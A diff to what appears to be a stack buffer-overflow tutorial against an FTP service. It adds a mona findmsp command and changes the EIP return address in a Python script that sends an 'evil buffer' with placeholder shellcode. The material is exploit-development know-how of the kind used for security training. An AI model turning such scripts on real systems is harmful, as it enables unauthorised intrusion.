@@ -92,6 +92,8 @@ Finding pattern offset
 msf-pattern_offset -l [pattern length] -q [EIP address]
 #msf-pattern_offset -l 300 -q 41326941                                               
 #Exact match at offset 246
+
+!mona findmsp -distance 400
 ```
 
 Modifying the script to override EIP with four “B” characters instead of the As in order to verify whether the last test was successful:
@@ -271,7 +273,7 @@ port = 21
 try:
 	print "\n[+] Sending evil buffer..."
 	offset = "A" * 246 #defining the offset value
-        EIP = "\xDB\x09\x49\x77" #EIP placeholder
+        EIP = "\x53\x0a\x77\x77" #EIP placeholder 
         shellcode = "C" * (700 - (len(offset) -len(EIP))) #Shellcode placeholder using about 550 Cs
         buffer = offset + EIP + shellcode #assembling the buffer
         s = socket(AF_INET,SOCK_STREAM)
